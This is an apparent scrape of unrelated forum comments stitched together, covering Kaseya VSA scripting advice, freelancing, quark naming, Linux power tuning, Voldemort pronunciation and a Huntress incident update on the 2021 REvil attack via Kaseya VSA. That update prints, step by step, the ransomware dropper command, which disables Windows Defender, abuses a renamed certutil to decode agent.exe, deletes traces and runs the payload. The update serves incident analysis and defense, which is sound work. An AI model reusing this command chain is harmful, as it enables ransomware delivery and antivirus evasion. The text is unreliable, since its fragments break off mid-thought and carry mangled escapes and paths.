You will wind up leaving trash behind, which becomes a security risk. It\\'s also difficult to clean up as most installs create lots of extraction, temp, and log files, so removing the MSI/EXE that you deploy isn\\'t enough.  * Create a working subfolder in C\\\\\\\\Temp. deploy files there, execute from there, and log results to there. Pull the log file via GetFile when done, then recursively delete the work subfolder. Always use a unique, short name without spaces in case multiple deployments are triggered. Leaving install packages and logs behind is considered a potential security vulnerability. Eliminating spaces eliminates the need to worry about when to quote paths and when not to. * ALWAYS use executeShellCommandToVariable so you can collect, parse, and log the results of the command - otherwise you\\'re operating in the dark. You can review the output for either success or failure messages and write script logs appropriately. * STOP including \"X86\" and \"X64\" in file names on the endpoint.     * Place \"my\\\\_installer\\\\_x64\" and \"my\\\\_installer\\\\_x86\" in your \"deploy-from\" folder.    * Detect the OS and download the appropriate file to \"my\\\\_installer\" - without any platform ID. Then - simply run \"my\\\\_installer\" as it will be the correct, platform-specific version. This simplifies the remaining script logic and eliminates lots of code duplication, reducing complexity and enhancing reliability. * You make an assumption in your WriteProcedureLogEntry that it worked, but you aren\\'t checking anything to confirm this. There are two ways - brute-force or elegant - to handle this.    * BRUTE FORCE - What you\\'re doing now - HALT ON FAIL in the command   Downside to this is that you don\\'t know WHY it failed. I NEVER use HALT ON FAIL for commands, but do use it to force an intentional script failure. Also, this only works when the script fails and may not accurately report when the ACTION fails.    * ELEGANT -        * Use - executeShellCommandToVariable to collect the output combined with CONTINUE ON FAIL.        * Examine the GLOBALCmdResults variable for either NOT CONTAINS \"Success Message\" or CONTAINS \"Fail Message\" (the former is usually easier as there can be many possible failure messages). When this is TRUE, you write a failure message to the procedure log, then - with HALT ON FAIL set, perform an illegal action, such as loading a variable from an invalid file (Q\\\\\\\\Nowhere\\\\\\\\badfile.123). This forces the procedure to fail AFTER you write the status and the collected results to the log. You can then add a message following this logic to report your success.   This has the benefit of confirming that the ACTION was successful, not simply whether the command ran but didn\\'t successfully perform the desired action * Avoid long, nested IF statements to check progress. This logic becomes difficult to follow and troubleshoot. This isn\\'t in your script, but I\\'ve seen many public examples of this, and it\\'s just poor design. Instead, perform a check and if the check fails, write a log message why and force the script failure as noted above. Each check is it\\'s own If/Then clause - same result, less clutter and confusion, with better logging. * Avoid executeFile and similar as you lose insight into the process. Also note that executeShellCommandToVariable uses a unique file name to collect output for each command, while executePowerShellToVariable does not. A hung PS1 script can either prevent other PS scripts from running and WILL result in incorrect results being returned. We NEVER use the executepSP commands in VSA, preferring to use executeShellCommand to specify the powershell command, arguments, script, and script arguments.

And that fits me much better. (Apologies for the long-winded response)\", 'Well, I had been looking for a while for regular employment, but I wasn\\'t having any luck with that. As a game developer, living in a country with an almost non-existant games industry such as Venezuela, my local options where extremely few, so I had given up on them from the get-go. I looked abroad, but employers didn\\'t seem to want to hire a junior foreigner like me. So an industry acquaintance I made over the internet suggested I should try doing freelance work to get myself some paid experience. I checked out several freelancing pages (Fiverr, Freelancer, Kwork, among many others that aren\\'t worth mentioning) looking for one that offered me the best chances. I saw that they largely split into two models either the sellers published the services and the buyers approached; or the buyers published projects and the sellers approached. Turns out I saw a golden opportunity on the later model.  I don\\'t know if this is the case for all fields on the platform, but in mine I was seeing lots of bots bidding on the projects. Always the same faces, sending the same cookiecutter proposals. It always went along the lines of \"Hi there! I read your requirements and understood them completely. I have X years of experience, blah blah blah\". So just by being human, and delivering custom proposals, I automatically stood out from the rest. I also abused certain tricks I learned over the years from several books in psychology in order to build rapport faster with potential clients. But I won\\'t be sharing those as readily on the internet in order to keep my competitive advantage ;) (Plus, I have a somewhat decent looking portfolio by now) But yeah... The result was that after sending 4 proposals over the course of a week, I heard back from 3 of those potential clients, and entered a contract with 2 of them.', \"I think there are several possible ways of entering game industry even in recession times.  * Easy with a bit of specific knowledge     - Junior QA or manual game tester (but if you're lucky to get this job)     - Join Playtest clowd or platforms like this to test games for money (your region is not the worst for it, I guess). * Create a Portfolio to apply for better jobs    1) you can make and publish your own project    2) or you can join an indie project, where games are made on enthusiasm.

Apply for a job, go to interviews to have experience of being interviewed (=\", 'That is true, though that\\'s less fun punny and more just sound patriotic or good. Law names do get stupid though, and when reading a title the conclusion you should generally draw is that whatever the acronym is made to sound like, the bill probably does the opposite. On the physics side, it\\'s especially prevalent in particle physics. It also often uses \"clever\" names for things. It\\'s rather amusing. One of the main studied candidates for dark matter are WIMPs (weakly interacting massive particles) and they are in contrast to MACHOs (massive astrophysical compact halo objects). As it was found protons and neutrons had substructure, we named the positive charged bits \"up\" and negative bits \"down\". Then we found a new quark with the same charge as the up. That wasn\\'t really expected and it sort of messed up the model at the time. It was strange, so we called it the strange quark and the property of having strange quarks the \"strangeness\" of a particle. The work quark itself comes from Joyce\\'s Finnegans Wake, with Gell-Mann describing the naming process as so \"In 1963, when I assigned the name \"quark\" to the fundamental constituents of the nucleon, I had the sound first, without the spelling, which could have been \"kwork\". Then, in one of my occasional perusals of Finnegans Wake, by James Joyce, I came across the word \"quark\" in the phrase \"Three quarks for Muster Mark\". Since \"quark\" (meaning, for one thing, the cry of the gull) was clearly intended to rhyme with \"Mark\", as well as \"bark\" and other such words, I had to find an excuse to pronounce it as \"kwork\". But the book represents the dream of a publican named Humphrey Chimpden Earwicker. Words in the text are typically drawn from several sources at once, like the \"portmanteau\" words in Through the Looking-Glass. From time to time, phrases occur in the book that are partially determined by calls for drinks at the bar. I argued, therefore, that perhaps one of the multiple sources of the cry \"Three quarks for Muster Mark\" might be \"Three quarts for Mister Mark\", in which case the pronunciation \"kwork\" would not be totally unjustified. In any case, the number three fitted perfectly the way quarks occur in nature.\" We created a new model called the Eightfold way, named after the Eightfold path of Buddhism, to try and account for strange quarks.  The model developed further, and the favored mathematical model predicted a 4th quark with the charge of a down quark. It was named the charm or charmed quark, because it\\'d be really nice if it existed and make the math \"beautiful\". Eventually, we found two others that we had reasonable certainty were the last, and as they were the heaviest and final they were named top and down as they were the uppest of up quarks and downest of down quarks. There\\'s another purely theoretical theory called supersymmetry that if exists requires a supersymmetric superpartner of all fermions. The current convention is to add s to in front of all words in something\\'s partner\\'s name. You have 6 squarks, the sup squark, sdown squark, sstrange squark, scharm squark, stop squark and sbottom squark. Eventually for unstable particles that just kept adding up, people got lazy and we just started using latin and greek letters to name them. Now names are pretty inconsistent, and sometimes for no apparent reason like the 3 generations of the electron family being named electron, muon and tau. Technically it\\'s called tauon, but it\\'s usually referred to as just tau. Reading a particle physics paper feels like reading a super dense, technical paper where the author let their 5 year old name things. I both love and hate it.', 'Hey There!

The two leptons may be classified into one with electric charge -1 (electron-like) and neutral (neutrino); the two quarks may be classified into one with charge -1/3 (down-type) and one with charge 2/3 (up-type). The basic features of quark-lepton generation or families, such as their masses and mixings etc., can be described by some of the proposed family symmetries.\"      Lets take a step back from science and try one last one but this time we will elaborate a little more on it.      wisdom, power, courage with just wisdom and power you know what to do and you have the power to do it but you don\\'t have the courage to actually act and accomplish it. with just wisdom and courage you know what to do and you have the will to do it but you don\\'t have the power to accomplish it. with just power and courage you have the ability and will to do it but you don\\'t know what to do.

One escalated to a Sev-1 with Kaseya when the VSA got locked in a post patch-update reboot/scan loop, rebooting every few minutes. They had nearly a quarter-million procedures queued (with 3200 agents!) and had to clear them through a SQL query - a process that took over 50 hours to complete. Also had to clear the message queue before bringing VSA fully back online. They wound up expanding the SQL storage volumes, running a compress operation, and are considering some additional RAM and optimizations that we recommended as part of this remediation. They found that the DB had suddenly grown from around 12G to over 45G. A second client called today that had back-end changes that occurred 5/1. Default agent directory changed and there\\'s no option to set it (they use a custom working dir). Agents installed since the upgrade are using the other (KWorking) working folder, haven\\'t fully deployed files into the directory, and agents refuse to have any policies apply. We again found many procedures that were stuck since 5/1 that should have been running tasks daily. Waiting for some additional info from the client before we open a ticket for them with Kaseya. They had a ticket with us 2 days ago related to failed reporting on VSA, spinning and no output generated. We\\'re now thinking it\\'s related to the more serious issue. I also checked our two dev servers and neither one has the option to set the default working directory now (updated to latest release last weekend) - that was an essential process when on-prem clients wanted to use a custom working directory. On-prem now looks like SAAS without the \"set system default\" option for the working directory. Anyway - just pointing out some of the items we saw while troubleshooting.

For those searching for the video, we\\'d posted it to our website. We\\'ve also received a large number of requests from partners and media asking for a statement on our response timeline and \"whether Huntress was the first to detect the incident?\". Frankly speaking, it\\'s likely compromised MSPs were the first to call Kaseya. It took us about an hour to confirm VSA was being mass compromised (we initially tracked these as individual MSP incidents). As for an official timeline, our CEO previously posted and Huntress started gathering sporadic intel from multiple sources (our data, phone calls, support tickets) \\\\~10min after ransomware started deploying en masse. Roughly an hour after the first shots were fired, I personally emailed Kaseya Executives and reached out to the Kaseya Security team on Discord. I received a phone call from Kaseya within 10 minutes of my first outreach and we were on a Zoom with their team dumping details and planning response actions 92 minutes from the first detonation. Thank again for all the community support!  Update 19 - 07/13/2021 - 0953 ET In Update 5 of our Reddit post (7/2/2021 2110 ET) thread, we mentioned, “For our Huntress partners using VSA, we took proactive steps to help protect your systems. We will send out a follow-up with details.” We decided to be intentionally vague until Kaseya released the required patch. Now, we can share those “proactive steps” we took and explain why we took them. **What We Saw** About two hours after the incidents started, we were alerted to the payload that was used, obfuscated as “Kaseya VSA Agent Hot-fix” `C\\\\WINDOWS\\\\system32\\\\cmd.exe\" /c ping 127.0.0.1 -n 4979 > nul & C\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend & copy /Y C\\\\Windows\\\\System32\\\\certutil.exe C\\\\Windows\\\\cert.exe & echo %RANDOM% >> C\\\\Windows\\\\cert.exe & C\\\\Windows\\\\cert.exe -decode c\\\\kworking\\\\agent.crt c\\\\kworking\\\\agent.exe & del /q /f c\\\\kworking\\\\agent.crt C\\\\Windows\\\\cert.exe & c\\\\kworking\\\\agent.exe` Our ThreatOps and Engineering teams reviewed the payload and were able to pull out some bits of information that would eventually lead to a way to “vaccinate” Huntress partners from getting encrypted. We looked at the following 1. `copy /Y C\\\\Windows\\\\System32\\\\certutil.exe C\\\\Windows\\\\cert.exe` Make a copy of the legitimate Windows `certutil.exe` utility and place it in the `C\\\\Windows\\\\` folder with a new name `cert.exe`. 2. `echo %RANDOM% >> C\\\\Windows\\\\cert.exe` Append a \"random\" value to the end of `cert.exe`. This is accomplished with a built-in feature of DOS where the %RANDOM% environment variable will produce a random value when called. Appending this to the end of a legit executable doesn\\'t prevent that executable from running, but it changes the hash which may be used in automated detection platforms to detect its use. 3. `C\\\\Windows\\\\cert.exe -decode c\\\\kworking\\\\agent.crt c\\\\kworking\\\\agent.exe` Using the modified but legitimate Windows `certutil`, the attackers decoded the malicious payload, `agent.exe` from the `agent.crt` file that was sent down to endpoints via the VSA server. 4. `del /q /f c\\\\kworking\\\\agent.crt C\\\\Windows\\\\cert.exe` Delete the `agent.crt` and `cert.exe` files. 5. `c\\\\kworking\\\\agent.exe` Execute the ransomware payload, `agent.exe`. In these examples, `c\\\\kworking` was displayed and the default directory, but this is actually a configurable variable known as vAgentConfiguration.AgentTempDir in a given VSA deployment. If this is changed, the attack would\\'ve been carried out in the configured directory. **What Is** `certutil.exe` According to Microsoft, “`Certutil.exe` is a command-line program, installed as part of Certificate Services. You can use certutil.exe to dump and display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains.” Essentially, if you give `certutil.exe` a certificate to decode, it does just that. In this case, `cert.exe` would base64 decode `agent.crt` to `agent.exe`. REvil understood this and used it maliciously. However, if there’s a file that has the same name as the decoded name, then `certutil` won’t decode it because it’s “in the way.” Therefore, to “vaccinate” VSA servers from running a malicious program, all that was needed was to add an innocent file of the same name as `agent.exe` (video demonstration( **What We Did** The Huntress platform allows us to pull files in case we need to run some extra investigation on suspicious activity, something we did a lot during this attack, but it also allows us to push files down to endpoints with the Huntress service. With that knowledge, our engineers got to work creating a fake `agent.exe` to send to the `C\\\\kworking\\\\` dir.However, there were a few problems with this vaccine 1. If REvil caught wind of the vaccine, they could just change the name of the file or directory, and it would run as intended. 2. The `kworking` dir is configurable, so if it is named something different, the vaccine wouldn’t work. 3. The Huntress agent.exe could be confused with the REvil `agent.exe`. Taking all of these into account, we decided it would be best to just push it out. The decision to push out the vaccine as soon as we had it wasn’t something we took lightly. However, we saw what felt like an opportunity to help in the time of a crisis, and we knew the vaccine wouldn’t cause any damage. Because of this, we acted fast and pushed it out to our partners. The vaccine was initially pushed out before 1830 ET that evening to all Huntress agents as long as they were checking in. The Huntress `agent.exe` is a text file( that includes instructions for how to contact us. We let Kaseya and other vendors know what the Huntress `agent.exe` file hashes were so they didn’t block it and wouldn’t have any false positives for any detectors **MD5** 10ec4c5b19b88a5e1b7bf1e3a9b43c12 **SHA1** a4636c16b43affa1957a9f1edbd725a0d9c42e3a **SHA256** 5dca077e18f20fc7c8c08b9fd0be6154b4c16a7dcf45bdf69767fa1ce32f4f5d Some partners have since brought up that they thought they were hacked because they saw the `agent.exe` file but then realized that it was the Huntress version. We never want to give our customers an unnecessary reason to panic, but in this emergency situation, we were okay with people being a bit shocked with what turned out to be an innocent file rather than being fully encrypted. Even so, we felt it wise to make another version of the `agent.exe` text file( Hopefully, this update helps contribute to the efforts of cybersecurity researchers so we can all be more prepared for the next event.

Sure he hasn\\'t got much of a bark   And sure any he has it\\'s all beside the mark.

It was a custom built thirteen bedroom home built back in the 60s for a couple with ten children. They used some of the bedrooms to run a business out of. Backs up to the homes of the parents of each son in law. Both sets of those parents provided the $112,000 down payment to balance out what they had spent educating older siblings of the son in laws.  Most of the homes in the neighborhood are modest 1,500 to 2,000 sq ft, three or four bedroom homes, selling for $200,000 with property tax being around $3,000 per year. Taxes on this home are just above $8,000 per year which falls well below the SALT cap on federal deductibility. Utilities are another $10,000 a year. 7,500 sq ft is highly overrated, unless you have 16 people living in it, and 4 college students living in old two travel trailers with hookups behind the garage. My parents, hubby\\'s parents, and hubby and I live here at the request if the son in laws and daughters.  It works because we adults have seperate areas to retreat into and all adults stay out of the private business of the other adults. And as Paul Simon sang, we\\'re \"still crazy after all these years!\" Two years ago, yougest son in law was up in NYC and then out in LA on job assignments. He stayed in the penthouse of a client that overlooks Central Park in NYC, and the home of a client that overlooks the Pacific out in LA. At both firm offices he got felt out for the possibility of moving there.  He was thinking \"My brief years of being a tax attorney have not been for naught. I work 45 hours per week for more net pay than I would have left after kworking 70 hous here with 45%  combined payroll, federal income tax and AMT, state and local income tax, and a home mortgage five plus times larger than we have. I also like the polish dogs and chicken bake at Costco food court more than steak and lobster.

And if Mama\\'s not happy, nobody\\'s happy, especially me, son! Besides, it\\'s really cold up there in Siberia (Michigan).\\'\" LOL He did not share that thought.

If so, you can use `echo Y|net use ...` to send the \"Y\" key as input to the command.

There\\'s probably a way to do it from PowerShell... `cmd.exe /c echo Y|net use z \\\\\\\\svr\\\\share`. > this just gets wierder and wierder. This has been my experience with Kaseya procedures lol.. once they work they can be super useful, but getting them to that point can be a major pain!  One thing that might help is to run as many commands in **executeShellCommand()** steps as possible, and redirect their output and error streams to a text file, so you can see if they are returning errors. `net use Z \\\\\\\\svr\\\\share >>dir\\\\NetUseCmd.txt 2>>>>&1` Normally in a command prompt you\\'d just do `net use Z \\\\\\\\svr\\\\share >c\\\\kworking\\\\NetUseCmd.txt 2>>&1`, but in Kaseya the `>` character is reserved.  Then you can use the **getFile()** step to upload NetUseCmd.txt into the documents, or what I like to do is use the **getVariable()** step (with the 1st dropdown set to File Content), then use the **sendEmail()** step to email myself the output of the file (that way if a procedure takes a while to run then I don\\'t have to keep checking to see when it\\'s done).', \"Awesome suggestions! We have a ton of automation around VSA, and we put most complex logic into external applications and use Kaseya to Deploy, Execute, and Collect. These are things it does exceptionally well. We have a tool that we sell called the Multi-Tool. Things like who you run as (System/User) and environment (32/64b) will make a big difference when you are in the execute phase, but if you're externalizing your logic (as it seems) and using the deploy/execute/retrieve methods, there's not much you can't do. Glenn PS - we recommend using the TEMP folder and NOT the KWorking folder for your scripts/commands. Create a subfolder and do all the work there. Collect the logs (if any) and then recursively delete your working folder to clean up. We only use the KWorking folder for config data, create a tools subfolder for things we use regularly, and use the TEMP\\\\\\\\app subfolder for any transient work - installs, one-off's, etc. Keeps the system clean and prevents their use in unexpected ways or times.\", 'What I\\'ve done so far thats been effective in troubleshooting I run my powershell script via ExecuteShellCommandToVariable. In the procedure, I disable the writefile so that it just runs the same powershell script thats already in c\\\\kworking... now I can edit the script and re-test easily. At the end of my powershell script, I have it write a dummy file to show that the script is finished, then I have the script sleep for 30 seconds, so that I can open the command results text file in a notepad before it gets deleted Its done the trick here! but seriously... I gotta scratch my head at some of these RMMs. Is it just the \"traditional\" big ones like Labtech and Kaseya that are so damn convoluted in how they do basic things like run a powershell script? I haven\\'t tried any of the newer RMMs yet, so I don\\'t know if any of them are any better or not.', 'I\\'ve been developing scripts (\"agent procedures\") in Kaseya for around 9 years now, and used it for deploying 100s of PowerShell scripts over the last couple years. I strongly recommend avoiding as many of the builtin \"steps\" on the left as possible, and using **executeShellCommand()** wherever you can.  Example There\\'s a **deleteFile()** command -- I never use it. Instead, I use **executeShellCommand()** (as System) and run the command `del /F /Q (full_path_to_file)`.  The main reason I recommend avoiding the built-in steps is that they are \"black box\" functionality you have little to no control over. When they fail, you have no idea why. Want to run **deleteFile()** as the agent credential account? You can\\'t -- there\\'s no option for it (so it will only run as SYSTEM). Want to delete a file using wildcards? You can\\'t. But you can do both of those things with **executeShellCommand()** and the `del` command. For running PowerShell scripts, here\\'s the basic outline I use 1. Add a **getVariable()** step (under the System section) and set the dropdown in the top-right to \"Agent Working Directory Path\" and set the name to **dir**. Now in your procedure you can refer to **dir** and it will correspond to your working directory (rather than hard-coding it in the procedure -- if you did that then if you ever changed it you\\'d need to change it in every procedure -- plus you only have to type **dir** instead of **C\\\\MyCompany\\\\kworking** -- also some computers don\\'t have the Windows installation on C\\\\ !). 2. Add an **executeShellCommand()** step and delete the PowerShell script, and the output text file that the PowerShell script is going to create, from the computer. `del /F /Q dir\\\\Get-Info.ps1` and `del /F /Q dir\\\\Get-Info.txt`. 3. Use the **writeFile()** step under the File section to write the PowerShell script to **dir\\\\PowerShellScriptName.ps1**. When you\\'re in Kaseya Agent Procedures >> Manage Procedures >> Schedule / Create, there is a **Manage Files** button at the top. You can use this to upload files to your VSA server. Then in procedures the **writeFile()** step will download them from the server to the computer. You could also upload them to an FTP/HTTP server, but I\\'ve encountered security-conscious clients that lock down external HTTP access, which could block those downloads. 4. Use the **executeShellCommand()** step to run your PowerShell script, which exports any data you want to text files. Run the command `powershell.exe -ExecutionPolicy Bypass -File dir\\\\PowerShellScriptName.ps1` (with any parameters passed to the script after that, if needed). I\\'ll add a parameter called `-outFile` to my scripts, so I can pass `-outFile dir\\\\TextFileName.txt` to the script. That way the PS script also doesn\\'t have the agent working directory hardcoded in it. 5. Use the **testFile()** step under the \"IFs\" section to test if the output file was created by the PowerShell script (this is why deleting the output file in step 2 above is important). If not, then there\\'s either an issue with PowerShell, Windows, the Kaseya agent, or file permissions. You can add the **else** step below the **testFile()**, and one way to force the procedure to show a \"Failed\" status in the logs and in the LastExecStatus column is to add the **executeFile()** step under the File section, and make it run some bogus EXE that won\\'t exist (like **C\\\\PowerShellScriptDidNotCreateExpectedFile.exe**). (Note that you can click a line then press Tab to indent it to the right, and ShiftTab to outdent it back to the left. Any line under an If step needs to be indented once to the right, then the Else should be at the same level as the If, and anything under the Else should be indented to the right). 6. Add the **getVariable()** step, set the top-right dropdown to **File Content**, and set the 2nd dropdown to the path of the output text file (**dir\\\\TextFileName.txt**). Give the variable a name like **output** (notice there are no \\'s in the name). Then in the procedure you can use **output** to refer to the content of that text file. You can do things like using the **writeProcedureLogEntry()** step under System to write **output** to the procedure log, and then you can create an Info Center report that shows those log entries. It\\'s very hokey, but I\\'ve found it\\'s the most robust way to do advanced/custom reporting from Kaseya.', \"Indeed.

Glenn\", \"We provide our customers with hundreds of Agent Procedures plus scripts, and never, ever write these to the KWorking folder. It's easy to find the TEMP environment var in the registry - we create a subfolder there, push all our scripts, install files, etc there. The task writes it's logs there as well. Once the procedure is complete, we use GetFile to upload the log, then recursively delete the folder we created, leaving nothing behind. The only difference from what Ages4020 is suggesting is reading the registry first to find the TEMP location. Create the TEMP\\\\\\\\PROCESS\\\\_NAME folder. Then we either use WriteDirectory to write several files or WriteFile to write individual files to that folder. ExecutePowerShell (or executeCommandLine, which sometimes works better), then GetFile to get the log and DeleteFolder with the recursive option. We find too many MSPs use the KWorking folder as a temporary repository. This is difficult to clean up, and this leaves behind potential vulnerabilities. Using a TEMP\\\\\\\\working\\\\_folder minimizes the risk because it's present only for the duration of the installation process, then everything is removed. Glenn\", \"Call today... I need to set working directory at install. Used to be achievable by copying template settings. In VSA 9.something they removed the ability to change template settings, because apparently everyone in the MSP world is cool with c\\\\kworking existing on every machine. Now the only way to set working directory is via policy. Which takes at least 5 minutes. Which means procedures that are in middle of writing files to the machine break and lose permissions to everything, lagging out procedures on that device until it's restarted, when the policy updates the working directory. Oh but wait, Kaseya released an awesome REST based API that we've been heavily relying on because their scheduling engine works on prayers, so we built a whole application that works with kaseya API to fill in gaps.

There are two things you\\'re looking for  Wakeups - programs register to receive some events from the OS, and they start working once an event is received (eg \"new incoming data on the network\", \"mouse moved\", \"key pressed\", etc). Most of the time, these events do not require a lot of work and handling a few events per second doesn\\'t matter that much (of course there are events that can take a lot of time to process, but they\\'re rare and the sooner a long, CPU-hoggy job is over, the better, instead of keeping your CPU awake in higher power states for longer), but if you\\'re receiving a lot of events, this starts to pile up. Once work starts to pile up, your CPU frequency goes up and stays there, and so does your power bill. If an app is receiving a lot of events, this might be something you should consider closing (if you don\\'t need it - or disabling any unneeded functionality if possible) to maximize your battery life. Under Overview, this is *Events/s*, and apps are sorted by that by default. If Category is *kWork* or *Timer*, you usually can\\'t do much about these - they\\'re just required for your OS to work properly. Unusually large amount of Interrupts from any idle device may suggest bad hardware or configuration (eg an idle network interface should show very few, if any, events per second - but if it\\'s idle and bombing your CPU with 200 interrupts/s, that might prompt you to investigate further). Processes are where you\\'re mostly looking for bad citizens - if something gets loaded with events or spends a lot of time working (in the Usage column), you might want to disable that or limit functionality. Tunables - Kernel features which let you enable some additional power saving features on the kernel side. The upside is that with solid hardware you\\'ll get better power management for free (although you might have to enable corresponding features in your BIOS/UEFI first). The downside is that with bad hardware (eg with buggy firmware) enabling power management usually ends badly and might occasionally render a given device useless or performance-limited until your PC is rebooted without PM features. Trust me, you\\'ll know when it happens. Aside from that, configure your system to use the CPU governor that\\'s either power-friendly (scales up slowly, down quickly) or performance-friendly (scales up quickly, down slowly). AFAIK P-States are still broken, but you\\'ll have to take a look in the wiki if it\\'s still the case. ', 'Sure.  I am not the scripting guy, but I can throw together messy things that seem to work.  I am sure there are better ways to achieve this.

In universe, it is a name which originates from an anagram of a (British) character\\'s name.  The fact that that name is symbolic if it is read as (fairly garbled) French is secondary. > Just because people \"english-ize\" because they don\\'t know how to pronounce it, it doesn\\'t make that \"the\" new pronunciation. They are just bastardizing a foreign word. the word still retains it\\'s original pronunciation because it\\'s not an English word. That\\'s not how language works at all.  The way most people pronounce a word absolutely is the way that word is pronounced.  The fact that there are French loanwords in English which are pronounced the same in English and French has absolutely no bearing on my point that that is not a universal rule. > So why would you decide that voldemort is one of the ones pronounced incorrectly without any in book examples of characters pronouncing it as such? That\\'s not what I\\'m arguing.  What I\\'m saying is that we have no idea how any of the characters in the books pronounce Voldemort.  We know how JKR has said in interviews *she* pronounces Voldemort, but absent any evidence in her in-universe writing, not everyone accepts that as canon, especially as it often conflicts with actual book-canon.   Secondly, I would suggest that given in our universe, Voldemort is pronounced in English with a terminal \\'t\\' sound more often than not, and this pronunciation is universally understood as referring to Voldemort, then in *our universe*, that absolutely is the correct pronunciation. > I don\\'t really see how this argument can go past that there\\'s no book canon example of anyone pronouncing the word any way, ~~and the author, who chose/created the words in the book canon, said the word they made up is pronounced a certain way.~~ I can\\'t see that someone who makes up a word, whether real or fictional, has absolute right to decide how that word is pronounced.  Presumably, if JKR had tweeted that \\'Voldemort\\' should be pronounced \\'Lollipop\\', you wouldn\\'t be arguing that I would be wrong to ignore her and continue pronouncing it \\'Voldemort\\'?  (Or, to steal Bernard Shaw\\'s (probably not actually Bernard Shaw, but attributed to him) famous example, if I told you of my new word \\'ghoti\\', you would call me absurd to insist it is pronounced identically to \\'fish\\', even though in English \\'gh\\' can be pronounced \\'f\\' (e.g. in \\'tough\\'), \\'o\\' can be pronounced \\'i\\' (e.g. in \\'women\\'), and \\'ti\\' can be pronounced \\'sh\\' (e.g. in \\'constitution\\'). Of course, these are extreme cases while \\'gh\\' can make an \\'f\\' sound, there are no English examples of this at the beginning of a syllable.  However, it is unquestionably the case that real invented words change their pronunciation to that other than what the creator \\'intended\\'.  \\'GIF\\', for example, is pronounced with a hard g by the majority of people, and that is recognised as a valid pronunciation by most major dictionaries, despite the insistences of Steve Wilhite. Likewise, Murray Gell-Mann named the particle the \\'quark\\' (pronounced \\'kwork\\') despite the fact that he derived the word from a line in *Finnegan\\'s Wake* in which it is rhymed with \\'Mark\\' and \\'bark\\'. Modern pronunciation has evolved, and quark can now be pronounced to rhyme with either \\'cork\\' or \\'mark\\'.  I see no reason why invented words should have to be pronounced as the author intended them in the case of JKR when this so plainly isn\\'t the case with other neologisms. > If there was a Gobbledegook (a made up Goblin language) word and no given pronunciation key in the text, so you ended up pronouncing it in your head incorrectly, would you decide that was the canon pronunciation even after the author states later out of text that the word is pronounced a certain way?  No, but nor would I decide that just because JKR had said that she pronounces it a certain way, then that is the correct pronunciation.

Gell-Mann chose the name \"quarks,\" pronounced \"kworks,\" for these three particles, a nonsense word used by James Joyce in the novel Finnegan\\'s Wake\"Three quarks for Muster Mark!\" There are six flavors of quarks. \"Flavors\" just means different kinds. The two lightest are called up and down. The third quark is called strange. It was named after the \"strangely\" long lifetime of the K particle, the first composite particle found to contain this quark. The fourth quark type, the charm quark, was named on a whim. It was discovered in 1974 almost simultaneously at both the Stanford Linear Accelerator Center (SLAC) and at Brookhaven National Laboratory. The fifth and sixth quarks were sometimes called truth and beauty in the past, but even physicists thought that was too cute. The bottom quark was first discovered at Fermi National Lab (Fermilab) in 1977, in a composite particle called Upsilon (). The top quark was discovered last, also at Fermilab, in 1995. It is the most massive quark. It had been predicted for a long time but had never been observed successfully until then. Stolen from ', 'You say  >it\\'s pronounced like \"cork\" so you\\'re making yourself sound really dumb. But I have never heard it pronounced that way.  Wikipedia says >Gell-Mann went into further detail regarding the name of the quark in his book, The Quark and the Jaguar45 In 1963, when I assigned the name \"quark\" to the fundamental constituents of the nucleon, I had the sound first, without the spelling, which could have been **\"kwork\"**. Then, in one of my occasional perusals of Finnegans Wake, by James Joyce, I came across the word \"quark\" in the phrase \"Three quarks for Muster Mark\". Since \"quark\" (meaning, for one thing, the cry of the gull) was clearly intended to **rhyme with \"Mark\"**, as well as \"bark\" and other such words, I had to find an excuse to pronounce it as \"kwork\". But the book represents the dream of a publican named Humphrey Chimpden Earwicker. Words in the text are typically drawn from several sources at once, like the \"portmanteau\" words in \"Through the Looking-Glass\". From time to time, phrases occur in the book that are partially determined by calls for drinks at the bar. I argued, therefore, that perhaps one of the multiple sources of the cry \"Three quarks for Muster Mark\" might be \"Three quarts for Mister Mark\", in which case the pronunciation \"kwork\" would not be totally unjustified. In any case, the number three fitted perfectly the way quarks occur in nature.

There\\'s no KOffice or KWord (if that\\'s what you mean with \"Kwork\") anymore; It was forked as Calligra and it includes both Words and Krita. Also many of the applications you listed were first of their kind on Linux. They have also almost completely stopped using the \"K\" in application names.

It\\'s the distributions that make the choises what applications are included by default... >and recent revisions have taken hints from UI from the tablet environments.

', '**John Green is all over this, yo** >Whether an author intentionally put a metaphor in a book is completely irrelevant. The reason metaphors exist in books is not so that your English teachers can torture you by having you search for them but instead because reading critically and nonliterally is a huge part of being a person It is through metaphor and symbolism that we enter into the life of someone else, and begin to ask their big questions as if they were our own. >It’s worth remembering here that language is itself a symbol (like, you are decoding these characters on your screen and turning them into ideas; if I were writing in Japanese, you wouldn’t be able to turn the characters into ideas) and so all reading is inherently critical. Metaphor and symbol is just another step in the same process, the process of sharing ideas among people who are separated by time and space and death and everything else. So the question of whether J.D. Salinger WANTED Holden’s questions about the ducks in the pond to be a metaphor for his own fears is not an interesting question. The interesting thing is how that metaphor gets inside of us and turns us into Holden, and gives us a way of thinking about our fears of growing up and growing old and losing what is magical about life. THAT is a really interesting thing, and it can only happen inside of us through metaphor. >We owe it to ourselves to read critically not so that we can get good grades in English but so that we might have better ways to think about the big questions of our existence and the existence of others. Whether J.D. Salinger wanted us to be better at being human doesn’t really matter; even if he didn’t want to, he still gave us some nice tools to make us more aware and engaged. **Also** >Books, at least in my opinion, belong to their readers, and the author’s opinion about how to pronounce words that s/he made up is not any more authoritative or interesting than the opinion of any other reader. > >Like, I do not believe that an author has a privileged relationship with a story simply because s/he happens to have written it. Let us take, for example, the word quark. James Joyce uses the word quark in Finnegan’s Wake, and then the physicist Murray Gel-Mann (who along with George Zweig proposed the existence of quarks) appropriated the word to describe a fundamental constituent of matter. > >But how to pronounce quark? Reading the text of Finnegan’s Wake, it could easily be argued that Joyce wanted quark pronounced to rhyme with the word Mark, but you could also argue—as Gel-Mann has—that he intended it to slant-rhyme with the word quart. I personally suspect that Joyce wanted us to say kark not kwork, but it doesn’t matter We say kwork. We decided, collectively, how to pronounce the word, and that’s essentially what language is It’s a group of people deciding which sounds will describe the world. >In the extraordinarily unlikely event that some future elementary particle is discovered and named the 